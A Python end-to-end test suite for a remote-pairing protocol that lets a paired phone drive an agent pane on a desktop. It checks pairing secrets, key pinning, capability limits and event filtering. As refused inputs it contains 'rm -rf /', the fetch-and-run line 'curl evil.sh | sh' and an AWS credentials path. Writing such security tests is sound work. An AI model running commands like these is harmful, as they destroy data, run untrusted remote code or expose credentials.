# SPDX-License-Identifier: GPL-3.0-or-later
"""End to end: a client pairs through the rendezvous and drives a pane (RRP/1).

Everything runs in one process over real sockets — a real WebSocket, a real Noise session and the
real relay — so what is tested is the thing that ships, not a stub of it.
"""
import asyncio
import tempfile
import unittest
from pathlib import Path

from remote import client as client_mod
from remote import host as host_mod
from remote import identity as identity_mod
from remote import panes as panes_mod
from remote import pairing, wire
from rendezvous.server import Store, build


def run(coroutine, timeout=30):
    return asyncio.run(asyncio.wait_for(coroutine, timeout))


class Harness:
    """A rendezvous, a desktop and whatever clients a test wants."""

    def __init__(self, capability=wire.AGENT, approve=True):
        self.capability = capability
        self.approve = approve
        self.requests = []

    async def __aenter__(self):
        self.temporary = tempfile.TemporaryDirectory()
        directory = Path(self.temporary.name)
        self.store = Store(":memory:")
        self.server = build(self.store)
        await self.server.start("127.0.0.1", 0)
        self.base = f"http://127.0.0.1:{self.server.port}"

        self.identity = identity_mod.Identity.create(directory)
        self.devices = identity_mod.DeviceStore(directory)
        self.source = panes_mod.DemoPaneSource()

        async def approver(request):
            self.requests.append(request)
            return self.approve, self.capability

        self.host = host_mod.Host(self.identity, self.devices, self.source,
                                  app_base="https://app.example", approver=approver,
                                  name="test desktop")
        await self.host.register(self.base)
        self.serving = asyncio.create_task(self.host.serve())
        for _ in range(100):                       # wait for the outbound socket to attach
            await asyncio.sleep(0.02)
            if self.host.socket is not None:
                break
        return self

    async def __aexit__(self, *exc):
        await self.host.stop()
        self.serving.cancel()
        with __import__("contextlib").suppress(asyncio.CancelledError):
            await self.serving
        await self.server.close()
        self.store.close()
        self.temporary.cleanup()

    async def pair(self, name="Pixel 9", platform="Chrome"):
        url, room = await self.host.open_pairing()
        client = client_mod.Client(self.base)
        paired = await client.pair(url, name=name, platform=platform)
        return client, paired, url, room


class PairingTests(unittest.TestCase):
    def test_pair_then_reconnect(self):
        async def main():
            async with Harness() as harness:
                client, paired, url, _ = await harness.pair()
                self.assertEqual(paired.capability, wire.AGENT)
                self.assertEqual(len(harness.devices.live()), 1)
                # Both ends derive the same confirmation code from the handshake.
                self.assertEqual(client.auth_code, harness.requests[0].code)
                self.assertEqual(harness.requests[0].name, "Pixel 9")
                await client.close()

                again = client_mod.Client(harness.base)
                welcome = await again.connect(paired)
                self.assertEqual(welcome["capability"], wire.AGENT)
                self.assertEqual(welcome["desktop"]["id"], harness.identity.desktop_id)
                panes = await again.expect("panes")
                self.assertEqual(len(panes["items"]), 2)
                await again.close()
        run(main())

    def test_a_refused_device_is_not_pinned(self):
        async def main():
            async with Harness(approve=False) as harness:
                url, _ = await harness.host.open_pairing()
                client = client_mod.Client(harness.base)
                with self.assertRaises(wire.WireError):
                    await client.pair(url, name="attacker", platform="curl")
                self.assertEqual(harness.devices.live(), [])
                await client.close()
        run(main())

    def test_the_pairing_secret_is_single_use(self):
        async def main():
            async with Harness() as harness:
                url, _ = await harness.host.open_pairing()
                first = client_mod.Client(harness.base)
                await first.pair(url, name="phone", platform="Chrome")
                await first.close()
                second = client_mod.Client(harness.base)
                with self.assertRaises(wire.WireError):
                    await second.pair(url, name="thief", platform="Chrome")
                await second.close()
                self.assertEqual(len(harness.devices.live()), 1)
        run(main())

    def test_a_wrong_secret_burns_the_room(self):
        async def main():
            async with Harness() as harness:
                url, room = await harness.host.open_pairing()
                bad = url.split("&s=")[0] + "&s=" + pairing.b64(b"\x00" * 16) + "&r=" + room.room
                attacker = client_mod.Client(harness.base)
                with self.assertRaises(wire.WireError):
                    await attacker.pair(bad, name="thief", platform="Chrome")
                await attacker.close()
                owner = client_mod.Client(harness.base)
                with self.assertRaises(wire.WireError):
                    await owner.pair(url, name="phone", platform="Chrome")
                await owner.close()
        run(main())

    def test_an_unpaired_device_cannot_connect(self):
        async def main():
            async with Harness() as harness:
                stranger = client_mod.Paired(desktop_public=harness.identity.public,
                                             device_id="deadbeef", capability=wire.FULL,
                                             static_private=__import__("os").urandom(32),
                                             desktop_id=harness.identity.desktop_id)
                client = client_mod.Client(harness.base)
                with self.assertRaises((client_mod.PinMismatch, wire.WireError,
                                        asyncio.TimeoutError, OSError)):
                    await client.connect(stranger)
                await client.close()
        run(main())

    def test_a_substituted_desktop_key_is_refused(self):
        """A client pins the desktop key; there is no path that accepts a different one."""
        async def main():
            async with Harness() as harness:
                _, paired, _, _ = await harness.pair()
                from remote import noise
                impostor = client_mod.Paired(
                    desktop_public=noise.generate_keypair()[1], device_id=paired.device_id,
                    capability=paired.capability, static_private=paired.static_private,
                    desktop_id=harness.identity.desktop_id)
                client = client_mod.Client(harness.base)
                with self.assertRaises((client_mod.PinMismatch, wire.WireError,
                                        asyncio.TimeoutError, OSError)):
                    await client.connect(impostor)
                await client.close()
        run(main())


class CapabilityTests(unittest.TestCase):
    def test_a_view_device_cannot_compose(self):
        async def main():
            async with Harness(capability=wire.VIEW) as harness:
                client, paired, _, _ = await harness.pair()
                await client.close()
                client = client_mod.Client(harness.base)
                await client.connect(paired)
                await client.expect("panes")
                await client.send({"t": "compose", "pane": "pane-1", "text": "rm -rf /"})
                error = await client.expect("error")
                self.assertEqual(error["code"], "not_permitted")
                await client.close()
        run(main())

    def test_an_agent_device_cannot_reach_the_shell(self):
        """`agent` is not a licence to run commands: compose is forced to the agent."""
        async def main():
            async with Harness(capability=wire.AGENT) as harness:
                client, paired, _, _ = await harness.pair()
                await client.close()
                client = client_mod.Client(harness.base)
                await client.connect(paired)
                await client.expect("panes")
                await client.send({"t": "compose", "pane": "pane-1", "text": "curl evil.sh | sh",
                                   "agent": False})
                error = await client.expect("error")
                self.assertEqual(error["code"], "not_permitted")
                await client.close()
        run(main())

    def test_revoking_ends_a_live_session(self):
        async def main():
            async with Harness() as harness:
                client, paired, _, _ = await harness.pair()
                await client.close()
                client = client_mod.Client(harness.base)
                await client.connect(paired)
                await client.expect("panes")
                harness.devices.revoke(paired.device_id)
                message = await asyncio.wait_for(client.inbox.get(), 10)
                self.assertIn(message["t"], ("revoked", "bye"))
                await client.close()
        run(main())

    def test_downgrading_applies_without_reconnecting(self):
        async def main():
            async with Harness(capability=wire.FULL) as harness:
                client, paired, _, _ = await harness.pair()
                await client.close()
                client = client_mod.Client(harness.base)
                await client.connect(paired)
                await client.expect("panes")
                harness.devices.set_capability(paired.device_id, wire.VIEW)
                await client.send({"t": "compose", "pane": "pane-1", "text": "hello"})
                error = await client.expect("error")
                self.assertEqual(error["code"], "not_permitted")
                await client.close()
        run(main())

    def test_forbidden_types_are_refused(self):
        async def main():
            async with Harness(capability=wire.FULL) as harness:
                client, paired, _, _ = await harness.pair()
                await client.close()
                client = client_mod.Client(harness.base)
                await client.connect(paired)
                await client.expect("panes")
                for kind in ("store_key", "configure", "import_warp", "set_model", "load_state"):
                    await client.send({"t": kind, "pane": "pane-1"})
                    error = await client.expect("error")
                    self.assertEqual(error["code"], "not_permitted", kind)
                await client.close()
        run(main())

    def test_plan_execute_refuses_a_path(self):
        async def main():
            async with Harness() as harness:
                client, paired, _, _ = await harness.pair()
                await client.close()
                client = client_mod.Client(harness.base)
                await client.connect(paired)
                await client.expect("panes")
                await client.send({"t": "plan_execute", "pane": "pane-1",
                                   "plan_id": "/home/elliott/.aws/credentials"})
                error = await client.expect("error")
                self.assertIn(error["code"], ("unknown_type", "not_permitted"))
                await client.close()
        run(main())


class StreamTests(unittest.TestCase):
    def test_a_prompt_from_the_phone_drives_a_turn(self):
        async def main():
            async with Harness() as harness:
                client, paired, _, _ = await harness.pair()
                await client.close()
                client = client_mod.Client(harness.base)
                await client.connect(paired)
                await client.expect("panes")
                await client.send({"t": "pane_focus", "pane": "pane-1"})
                await client.send({"t": "compose", "pane": "pane-1",
                                   "text": "why does the router send this to the shell?"})

                seen, deltas = set(), []
                deadline = asyncio.get_event_loop().time() + 20
                while "agent_finished" not in seen:
                    left = deadline - asyncio.get_event_loop().time()
                    message = await asyncio.wait_for(client.inbox.get(), max(left, 0.1))
                    if message["t"] != "agent":
                        continue
                    name = message["event"]["event"]
                    seen.add(name)
                    if name == "delta":
                        deltas.append(message["event"]["text"])
                self.assertIn("agent_started", seen)
                self.assertIn("tool_started", seen)
                self.assertIn("agent_finished", seen)
                self.assertIn("router", "".join(deltas))
                # The prompt is attributed to the device that sent it.
                await client.close()
        run(main())

    def test_withheld_events_never_reach_a_client(self):
        async def main():
            async with Harness() as harness:
                client, paired, _, _ = await harness.pair()
                await client.close()
                client = client_mod.Client(harness.base)
                await client.connect(paired)
                await client.expect("panes")
                await client.send({"t": "pane_focus", "pane": "pane-1"})
                await asyncio.sleep(0.1)
                for name in ("key_stored", "presets", "configured", "state_loaded"):
                    harness.source._emit("pane-1", {"event": name, "secret": "sk-live-123"})
                harness.source._emit("pane-1", {"event": "status", "text": "marker"})
                while True:
                    message = await asyncio.wait_for(client.inbox.get(), 10)
                    if message["t"] == "agent" and message["event"].get("text") == "marker":
                        break
                    if message["t"] == "agent":
                        self.assertTrue(wire.may_forward(message["event"]["event"]),
                                        message["event"]["event"])
                await client.close()
        run(main())

    def test_resume_replays_what_was_missed(self):
        async def main():
            async with Harness() as harness:
                client, paired, _, _ = await harness.pair()
                await client.close()
                client = client_mod.Client(harness.base)
                await client.connect(paired)
                panes = await client.expect("panes")
                seq = panes["seq"]
                await client.close()

                harness.source.set_status("pane-1", "running")
                harness.source.set_status("pane-1", "failed")
                await asyncio.sleep(0.1)

                back = client_mod.Client(harness.base)
                await back.connect(paired)
                await back.expect("panes")
                await back.send({"t": "resume", "streams": {"panes": seq},
                                 "hub_epoch": harness.host.epoch})
                resumed = await back.expect("resumed")
                self.assertGreaterEqual(resumed["streams"]["panes"], 2)
                await back.close()
        run(main())

    def test_a_stale_epoch_asks_for_a_restart(self):
        async def main():
            async with Harness() as harness:
                client, paired, _, _ = await harness.pair()
                await client.close()
                client = client_mod.Client(harness.base)
                await client.connect(paired)
                await client.expect("panes")
                await client.send({"t": "resume", "streams": {"panes": 3},
                                   "hub_epoch": "from-a-previous-process"})
                resumed = await client.expect("resumed")
                self.assertTrue(resumed["restart"])
                await client.close()
        run(main())


class RendezvousTests(unittest.TestCase):
    def test_registering_needs_the_private_key(self):
        async def main():
            async with Harness() as harness:
                import base64
                import urllib.request
                from remote import noise

                def post(path, payload):
                    request = urllib.request.Request(
                        harness.base + path, data=__import__("json").dumps(payload).encode(),
                        headers={"Content-Type": "application/json"}, method="POST")
                    try:
                        with urllib.request.urlopen(request, timeout=10) as response:
                            return response.status, __import__("json").loads(response.read())
                    except urllib.error.HTTPError as error:
                        return error.code, {}

                status, body = await asyncio.to_thread(post, "/v1/challenge", {})
                self.assertEqual(status, 200)
                # The victim's public key with a made-up proof must not register.
                status, _ = await asyncio.to_thread(
                    post, "/v1/register",
                    {"static_pubkey": base64.b64encode(harness.identity.public).decode(),
                     "challenge": body["challenge"], "proof": "00" * 32})
                self.assertEqual(status, 401)
        run(main())

    def test_the_desktop_id_is_bound_to_the_key(self):
        from rendezvous.server import derive_desktop_id
        import base64
        from remote import noise
        _, public = noise.generate_keypair()
        encoded = base64.b64encode(public).decode()
        self.assertEqual(derive_desktop_id(encoded), derive_desktop_id(encoded))
        self.assertEqual(len(derive_desktop_id(encoded)), 32)
        self.assertEqual(derive_desktop_id("not base64"), "")


if __name__ == "__main__":
    unittest.main()
